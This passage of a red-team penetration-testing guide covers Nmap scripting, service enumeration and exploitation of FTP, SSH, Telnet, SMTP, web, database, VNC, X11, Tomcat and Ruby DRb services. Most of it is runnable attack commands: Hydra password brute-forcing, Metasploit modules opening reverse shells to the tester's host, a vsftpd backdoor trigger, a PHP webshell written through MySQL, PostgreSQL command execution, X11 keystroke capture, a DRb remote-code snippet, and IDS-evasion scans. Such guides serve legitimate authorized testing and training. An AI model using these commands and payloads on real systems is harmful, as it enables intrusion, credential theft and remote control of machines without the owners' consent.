| `safe` | Won't crash or harm targets |
| `version` | Enhanced version detection |
| `vuln` | Check for known vulnerabilities |

### Running Scripts

```bash
# Run default scripts (equivalent to -sC)
nmap --script=default 192.168.1.1

# Shorthand for default scripts
nmap -sC 192.168.1.1

# Run all scripts in a category
nmap --script=vuln 192.168.1.1
nmap --script=brute 192.168.1.1

# Run a specific script
nmap --script=http-title 192.168.1.1

# Run multiple specific scripts
nmap --script=http-title,http-headers,http-methods 192.168.1.1

# Run scripts matching a pattern
nmap --script="http-*" 192.168.1.1

# Pass arguments to scripts
nmap --script=http-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.1

# List available scripts
ls /usr/share/nmap/scripts/
nmap --script-help "http-*"
```

### Recommended NSE Scripts for Red Teams

```bash
# Check for common vulnerabilities
nmap --script=vuln -sV 192.168.1.1

# SMB enumeration
nmap --script=smb-enum-shares,smb-enum-users 192.168.1.1

# HTTP enumeration
nmap --script=http-enum 192.168.1.1

# SSL/TLS weaknesses
nmap --script=ssl-enum-ciphers -p 443 192.168.1.1

# Check for EternalBlue (MS17-010)
nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.1

# Check for Shellshock
nmap --script=http-shellshock -p 80 192.168.1.1

# DNS brute force
nmap --script=dns-brute target.com

# FTP anonymous login
nmap --script=ftp-anon -p 21 192.168.1.1
```

---

## 27. Nmap Banner Grabbing

**Banner grabbing** collects information from service banners — version strings that services display when you connect. This reveals software and version info, which you can cross-reference with CVE databases.

```bash
# Service version detection (primary method)
nmap -sV 192.168.1.1

# NSE banner script
nmap --script=banner 192.168.1.1

# Banner grab on specific port
nmap --script=banner -p 21,22,25,80,110 192.168.1.1

# HTTP-specific banner grabbing
nmap --script=http-headers -p 80,8080,8443 192.168.1.1

# Combine sV with scripts for maximum info
nmap -sV --script=banner,http-headers,ssh-hostkey 192.168.1.1
```

### Manual Banner Grabbing (for comparison)

```bash
# Using netcat
nc -v 192.168.1.1 22
nc -v 192.168.1.1 80

# Using telnet
telnet 192.168.1.1 80
# Then type: HEAD / HTTP/1.0 [Enter][Enter]

# Using curl
curl -I http://192.168.1.1
```

---

## 28. Nmap — WHOIS Lookup

WHOIS provides registration information about IP addresses and domain names.

```bash
# WHOIS on an IP via Nmap script
nmap --script=whois-ip 192.168.1.1

# WHOIS on a domain
nmap --script=whois-domain target.com

# External WHOIS tools
whois target.com
whois 192.168.1.1
```

> **Red Team Use:** Before engaging a target, WHOIS gives you: the owning organization, abuse contact, ASN (Autonomous System Number), and IP range — confirming you're testing the right target and revealing other IPs they own.

---

## 29. Nmap — Subdomain Bruteforce

Discovering hidden subdomains expands your attack surface significantly.

```bash
# DNS brute force using NSE
nmap --script=dns-brute target.com

# With a custom wordlist
nmap --script=dns-brute --script-args dns-brute.hostlist=/usr/share/wordlists/subdomains.txt target.com

# Specify number of threads
nmap --script=dns-brute --script-args dns-brute.threads=10 target.com
```

### Alternative Tools for Subdomain Brute Force

```bash
# Using gobuster
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Using amass
amass enum -brute -d target.com

# Using subfinder
subfinder -d target.com
```

---

## 30. Nmap — Finding Hidden Directories

```bash
# HTTP enumeration script — discovers common web directories/files
nmap --script=http-enum -p 80,8080 192.168.1.1

# Check for specific paths
nmap --script=http-enum --script-args http-enum.basepath=/app/ 192.168.1.1

# List interesting files
nmap --script=http-shellshock,http-robots.txt,http-backup-finder -p 80 192.168.1.1
```

### Better Tools for Directory Brute Force (use alongside Nmap)

```bash
# gobuster
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt

# dirbuster (GUI)
dirbuster

# feroxbuster (fast recursive)
feroxbuster -u http://192.168.1.1

# nikto (web vulnerability scanner)
nikto -h http://192.168.1.1
```

---

## 31. Nmap — How to Detect Web Firewalls

### WAF Detection (Web Application Firewall)

```bash
# Detect WAF using NSE script
nmap --script=http-waf-detect -p 80,443 192.168.1.1

# Get WAF fingerprint
nmap --script=http-waf-fingerprint -p 80,443 192.168.1.1
```

### Using wafw00f (Dedicated Tool)

```bash
# Install
pip install wafw00f

# Detect WAF
wafw00f http://target.com
```

---

## 32. Nmap — MySQL Enumeration

```bash
# Basic MySQL detection
nmap -sV -p 3306 192.168.1.1

# MySQL enumeration scripts
nmap --script=mysql-info -p 3306 192.168.1.1
nmap --script=mysql-enum -p 3306 192.168.1.1

# Check for empty root password
nmap --script=mysql-empty-password -p 3306 192.168.1.1

# List all MySQL databases (if authenticated)
nmap --script=mysql-databases --script-args mysqluser=root,mysqlpass='' -p 3306 192.168.1.1

# List users
nmap --script=mysql-users --script-args mysqluser=root -p 3306 192.168.1.1

# Brute force MySQL credentials
nmap --script=mysql-brute -p 3306 192.168.1.1
```

---

## 33. Vulnerability Scanning Using Nmap

```bash
# Run all vulnerability scripts
sudo nmap --script=vuln -sV 192.168.1.1

# Scan for specific CVEs
nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.1         # EternalBlue
nmap --script=smb-vuln-ms08-067 -p 445 192.168.1.1         # Conficker/MS08-067
nmap --script=http-vuln-cve2014-2127 -p 443 192.168.1.1    # OpenSSL
nmap --script=ftp-vsftpd-backdoor -p 21 192.168.1.1         # vsftpd backdoor
nmap --script=http-shellshock -p 80 192.168.1.1             # Shellshock

# Full vulnerability + version scan
sudo nmap -sV --script=vuln -p- 192.168.1.1 -oA vuln_scan
```

---

## 34. Installing Webmap

**Webmap** is a web-based GUI dashboard for viewing Nmap scan results from XML files.

```bash
# Method 1: Docker (recommended)
docker pull rev3rse/webmap
docker run -d --name webmap -h webmap -p 8000:8000 rev3rse/webmap

# Access it at: http://localhost:8000

# Method 2: Manual installation
git clone https://github.com/Rev3rseSecurity/WebMap.git
cd WebMap/v2
pip3 install -r requirements.txt
python3 app.py
```

### Usage

```bash
# Run nmap and save to XML
sudo nmap -sV -oX scan.xml 192.168.1.0/24

# Upload scan.xml to Webmap via the web interface
# http://localhost:8000
```

---

## 35. Nmap Scanning and Generating a Report

### Full Professional Scan + Report

```bash
# Step 1: Full comprehensive scan with all outputs
sudo nmap -A -sV -sC -O -p- -T4 \
  --script=vuln,banner \
  -oA full_report \
  192.168.1.1

# This creates:
# full_report.nmap  (human readable)
# full_report.xml   (machine readable)
# full_report.gnmap (grepable)
```

### Convert XML Report to HTML

```bash
# Using xsltproc (built-in Nmap stylesheet)
xsltproc /usr/share/nmap/nmap.xsl full_report.xml -o report.html

# View the HTML report
firefox report.html
```

### Using Nmap Parser (Python)

```python
from libnmap.parser import NmapParser

report = NmapParser.parse_fromfile('full_report.xml')
for host in report.hosts:
    print(f"Host: {host.address} | Status: {host.status}")
    for svc in host.services:
        if svc.open():
            print(f"  Port {svc.port}/{svc.protocol} - {svc.service} {svc.banner}")
```

---

## 36. FTP Enumeration and Exploitation

**Port:** 21 (TCP)

### Enumeration

```bash
# Detect FTP version
nmap -sV -p 21 192.168.1.1

# Check for anonymous login
nmap --script=ftp-anon -p 21 192.168.1.1

# Full FTP enumeration
nmap --script="ftp-*" -p 21 192.168.1.1

# Check for vsftpd backdoor (version 2.3.4)
nmap --script=ftp-vsftpd-backdoor -p 21 192.168.1.1

# FTP brute force
nmap --script=ftp-brute -p 21 192.168.1.1
```

### Exploitation

```bash
# Anonymous FTP login
ftp 192.168.1.1
# Username: anonymous
# Password: anything@email.com

# vsftpd 2.3.4 Backdoor (opens shell on port 6200)
# Metasploit:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.1
run

# Manual trigger (send :) in username)
ftp 192.168.1.1
# Username: user:)
# Password: anything
# Then connect to port 6200:
nc 192.168.1.1 6200
```

---

## 37. SSH Enumeration and Exploitation (Msfconsole & Hydra)

**Port:** 22 (TCP)

### Enumeration

```bash
# SSH version detection
nmap -sV -p 22 192.168.1.1

# Full SSH enumeration
nmap --script="ssh-*" -p 22 192.168.1.1

# Get SSH host key
nmap --script=ssh-hostkey -p 22 192.168.1.1

# Enumerate supported auth methods
nmap --script=ssh-auth-methods -p 22 192.168.1.1

# Check for weak algorithms
nmap --script=ssh2-enum-algos -p 22 192.168.1.1
```

### Exploitation — Brute Force with Hydra

```bash
# Brute force SSH login
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Brute force with user list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Specify port and number of threads
hydra -l admin -P passwords.txt -s 22 -t 4 ssh://192.168.1.1
```

### Exploitation — Metasploit SSH Scanner

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.1
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
run
```

### Exploitation — Known SSH Vulnerabilities

```bash
# CVE-2018-10933 (libssh authentication bypass)
nmap --script=ssh-auth-methods --script-args="ssh.user=admin" -p 22 192.168.1.1

# Metasploit scanner for libssh bypass
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS 192.168.1.1
run
```

---

## 38. Telnet Enumeration and Exploitation

**Port:** 23 (TCP) — **Cleartext protocol** — extremely dangerous if exposed

### Enumeration

```bash
# Detect Telnet
nmap -sV -p 23 192.168.1.1

# Telnet enumeration scripts
nmap --script=telnet-ntlm-info -p 23 192.168.1.1
nmap --script=telnet-encryption -p 23 192.168.1.1
```

### Exploitation

```bash
# Simple connection (all data transmitted in cleartext)
telnet 192.168.1.1

# Brute force with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.1.1

# Metasploit Telnet brute force
msfconsole
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.1.1
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Man-in-the-middle to capture credentials (Wireshark + Telnet)
# Since Telnet is cleartext, capturing traffic reveals passwords directly
tcpdump -i eth0 port 23 -A
```

---

## 39. SMTP Enumeration and Exploitation

**Port:** 25 (TCP) — Used for sending email

### Enumeration

```bash
# SMTP version detection
nmap -sV -p 25 192.168.1.1

# Full SMTP enumeration
nmap --script="smtp-*" -p 25 192.168.1.1

# Enumerate valid users via VRFY/EXPN/RCPT commands
nmap --script=smtp-enum-users -p 25 192.168.1.1

# Check for open relay
nmap --script=smtp-open-relay -p 25 192.168.1.1

# Get SMTP server capabilities
nmap --script=smtp-commands -p 25 192.168.1.1
```

### Manual SMTP User Enumeration

```bash
nc -v 192.168.1.1 25
# Then:
EHLO test
VRFY root           # Check if user exists
EXPN root           # Expand mailing list
RCPT TO:<root@target.com>  # Indirect user enum
```

### Exploitation

```bash
# Use Metasploit SMTP user enum
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.1
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# SMTP brute force
hydra -L users.txt -P passwords.txt smtp://192.168.1.1
```

---

## 40. Port 80 Enumeration and Exploitation

**Ports:** 80 (HTTP), 443 (HTTPS), 8080, 8443, 8888 (alternate)

### Enumeration

```bash
# HTTP version and title
nmap -sV -p 80,443,8080 --script=http-title,http-headers,http-server-header 192.168.1.1

# Enumerate directories and files
nmap --script=http-enum -p 80 192.168.1.1

# Check for common vulnerabilities
nmap --script=http-vuln-* -p 80 192.168.1.1

# Identify technology stack
nmap --script=http-generator,http-php-version -p 80 192.168.1.1

# Check HTTP methods (look for PUT, DELETE)
nmap --script=http-methods -p 80 192.168.1.1

# Check robots.txt
nmap --script=http-robots.txt -p 80 192.168.1.1

# Detect SQLi
nmap --script=http-sql-injection -p 80 192.168.1.1

# Look for default credentials in web apps
nmap --script=http-default-accounts -p 80 192.168.1.1
```

### Exploitation

```bash
# Nikto web scanner
nikto -h http://192.168.1.1

# Gobuster directory brute force
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Metasploit HTTP exploit examples
msfconsole
search type:exploit platform:linux http
use exploit/multi/http/struts2_rest_xstream  # Example
set RHOSTS 192.168.1.1
run
```

---

## 41. NetBIOS Enumeration and Exploitation

**Ports:** 137/UDP, 138/UDP, 139/TCP — Legacy Windows network naming

### Enumeration

```bash
# Detect NetBIOS
nmap -sU --script nbstat.nse -p 137 192.168.1.1
nmap -sV --script nbstat -p 139 192.168.1.1

# SMB enumeration (closely related)
nmap --script=smb-enum-shares,smb-enum-users -p 139,445 192.168.1.1

# Check for null sessions
nmap --script=smb-security-mode -p 139,445 192.168.1.1
```

### Manual Enumeration

```bash
# Using nmblookup
nmblookup -A 192.168.1.1

# Using enum4linux (comprehensive)
enum4linux -a 192.168.1.1
enum4linux -u admin -p password -a 192.168.1.1

# Using smbclient
smbclient -L //192.168.1.1 -N     # Null session
smbclient //192.168.1.1/share -N  # Connect to share
```

---

## 42. Rexec Enumeration and Exploitation

**Port:** 512 (TCP) — Remote Execution service (legacy Unix)

### Enumeration

```bash
nmap -sV -p 512 192.168.1.1
nmap --script=rexec-brute -p 512 192.168.1.1
```

### Exploitation

```bash
# Connect via rexec (if trusted hosts file allows)
rexec 192.168.1.1 -l username -p password "command"

# Metasploit rexec brute force
msfconsole
use auxiliary/scanner/rservices/rexec_login
set RHOSTS 192.168.1.1
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

> **Note:** `.rhosts` file misconfiguration on legacy systems can allow trust-based access with no password.

---

## 43. JavaRMI Enumeration and Exploitation

**Port:** 1099 (TCP) — Java Remote Method Invocation

### Enumeration

```bash
nmap -sV -p 1099 192.168.1.1
nmap --script=rmi-dumpregistry -p 1099 192.168.1.1
nmap --script=rmi-vuln-classloader -p 1099 192.168.1.1
```

### Exploitation

```bash
# Metasploit Java RMI code execution
msfconsole
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.1.1
set RPORT 1099
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

> **Why it's dangerous:** Java RMI can load remote class files. If security is misconfigured, an attacker can send a malicious serialized Java object and execute arbitrary code on the server.

---

## 44. MySQL Enumeration and Exploitation

**Port:** 3306 (TCP)

### Enumeration

```bash
nmap -sV -p 3306 192.168.1.1
nmap --script=mysql-info,mysql-enum,mysql-empty-password -p 3306 192.168.1.1

# List databases
nmap --script=mysql-databases --script-args mysqluser=root -p 3306 192.168.1.1

# List users
nmap --script=mysql-users --script-args mysqluser=root -p 3306 192.168.1.1

# Check for privilege escalation
nmap --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password=''" -p 3306 192.168.1.1
```

### Exploitation

```bash
# Direct connection
mysql -h 192.168.1.1 -u root -p

# Brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.1

# Metasploit MySQL login
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.1
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Read files (if FILE privilege exists)
SELECT LOAD_FILE('/etc/passwd');

# Write files (webshell)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

---

## 45. PostgreSQL Enumeration and Exploitation

**Port:** 5432 (TCP)

### Enumeration

```bash
nmap -sV -p 5432 192.168.1.1
nmap --script=pgsql-brute -p 5432 192.168.1.1
```

### Exploitation

```bash
# Direct connection
psql -h 192.168.1.1 -U postgres

# Hydra brute force
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://192.168.1.1

# Metasploit login scanner
msfconsole
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.1.1
run

# Command execution (if superuser)
# In psql:
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

# Or use Metasploit for direct code execution
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 192.168.1.1
set LHOST <your_ip>
run
```

---

## 46. VNC Enumeration and Exploitation

**Port:** 5900 (TCP) — Virtual Network Computing (remote desktop)

### Enumeration

```bash
nmap -sV -p 5900 192.168.1.1
nmap --script=vnc-info,vnc-brute -p 5900 192.168.1.1
nmap --script=realvnc-auth-bypass -p 5900 192.168.1.1
```

### Exploitation

```bash
# VNC brute force with Hydra
hydra -P /usr/share/wordlists/rockyou.txt vnc://192.168.1.1

# Metasploit VNC login
msfconsole
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.1.1
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# RealVNC auth bypass (older versions)
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.1
run

# Connect to VNC once you have the password
vncviewer 192.168.1.1:5900
```

---

## 47. X11 Enumeration and Exploitation

**Port:** 6000 (TCP) — X Window System (remote display)

### Enumeration

```bash
nmap -sV -p 6000 192.168.1.1
nmap --script=x11-access -p 6000 192.168.1.1
```

### Exploitation

```bash
# Check if X server allows unauthenticated connections
xdpyinfo -display 192.168.1.1:0 2>/dev/null

# Take a screenshot of the remote display
xwd -root -screen -silent -display 192.168.1.1:0 -out screenshot.xwd
convert screenshot.xwd screenshot.png

# Open a terminal on the remote display
xterm -display 192.168.1.1:0 &

# Capture keystrokes
xspy -display 192.168.1.1:0

# Metasploit X11 keyboard sniffer
msfconsole
use auxiliary/gather/x11_keyboard_spy
set RHOSTS 192.168.1.1
run
```

> **Why it matters:** An open X11 display gives you a window into the victim's desktop — you can see what they're doing, capture keystrokes, take screenshots, and launch windows on their display.

---

## 48. Apache Tomcat Enumeration and Exploitation

**Port:** 8080 (TCP), 8443 (HTTPS)

### Enumeration

```bash
# Detect Tomcat
nmap -sV -p 8080,8443 192.168.1.1

# Enumerate Tomcat
nmap --script=http-enum -p 8080 192.168.1.1
nmap --script=ajp-headers -p 8009 192.168.1.1       # AJP port
nmap --script=ajp-request -p 8009 192.168.1.1

# Check for default credentials
nmap --script=http-default-accounts -p 8080 192.168.1.1
```

### Exploitation

```bash
# Brute force Tomcat Manager login
hydra -L users.txt -P passwords.txt http-get://192.168.1.1:8080/manager/html

# Metasploit Tomcat Manager Upload (deploy WAR shell)
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.1
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <your_ip>
run

# AJP Ghostcat (CVE-2020-1938) — read files without auth
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 192.168.1.1
set RPORT 8009
run
```

> **Default Credentials to Try:**
>
> - `tomcat:tomcat`
> - `admin:admin`
> - `admin:password`
> - `tomcat:s3cr3t`

---

## 49. Exploiting Ruby DRb Vulnerability

**Port:** 8787 (TCP) — Ruby Distributed Ruby (DRb)

### What is DRb?

Ruby's DRb (Distributed Ruby) allows Ruby objects to be shared across a network. If the DRb server is exposed without authentication, it allows **arbitrary remote code execution**.

### Enumeration

```bash
# Detect DRb service
nmap -sV -p 8787 192.168.1.1
nmap --script=drda-info -p 8787 192.168.1.1
```

### Exploitation

```bash
# Metasploit DRb remote code execution
msfconsole
use exploit/linux/misc/drb_remote_codeexec
set RHOST 192.168.1.1
set RPORT 8787
set PAYLOAD cmd/unix/reverse_bash
set LHOST <your_ip>
set LPORT 4444
run
```

### Manual Ruby DRb Exploitation

```ruby
require 'drb/drb'

SERVER_URI = "druby://192.168.1.1:8787"
DRb.start_service
remote = DRbObject.new_with_uri(SERVER_URI)

# Execute arbitrary command on remote server
remote.instance_eval { `id` }
```

> **Red Team Note:** DRb services should NEVER be exposed to untrusted networks. When found open, they almost always lead to immediate RCE.

---

## Quick Reference Cheat Sheet

```bash
# ==========================================
# DISCOVERY
# ==========================================
nmap -sn 192.168.1.0/24                    # Ping sweep
sudo nmap -PR 192.168.1.0/24               # ARP scan
sudo nmap -PE 192.168.1.0/24               # ICMP discovery

# ==========================================
# BASIC SCANS
# ==========================================
sudo nmap -sS 192.168.1.1                  # Stealth SYN
nmap -sT 192.168.1.1                       # TCP Connect
sudo nmap -sU 192.168.1.1                  # UDP scan
sudo nmap -A -sV -sC -O 192.168.1.1       # Full aggressive

# ==========================================
# IDS EVASION
# ==========================================
sudo nmap -sN 192.168.1.1                  # NULL scan
sudo nmap -sF 192.168.1.1                  # FIN scan
sudo nmap -sX 192.168.1.1                  # XMAS scan
sudo nmap -f 192.168.1.1                   # Fragmented packets
sudo nmap -D RND:10 192.168.1.1            # Decoy scan
sudo nmap --spoof-mac 0 192.168.1.1        # Random MAC
sudo nmap -T1 192.168.1.1                  # Sneaky timing

# ==========================================
# SERVICE ENUMERATION
# ==========================================
nmap -sV --script=banner 192.168.1.1       # Banner grab
nmap --script=vuln -sV 192.168.1.1         # Vuln scan
nmap --script="smb-*" -p 139,445 192.168.1.1  # SMB enum
nmap --script="ftp-*" -p 21 192.168.1.1       # FTP enum
nmap --script="http-*" -p 80,443 192.168.1.1  # HTTP enum

# ==========================================
# OUTPUT
# ==========================================
nmap -oA results 192.168.1.1               # All formats
nmap -oX results.xml 192.168.1.1           # XML only
xsltproc nmap.xsl results.xml -o report.html  # HTML report
```

---

*Document compiled for red team / penetration testing educational purposes.*  
*Always obtain proper written authorization before scanning any network or system you do not own.*
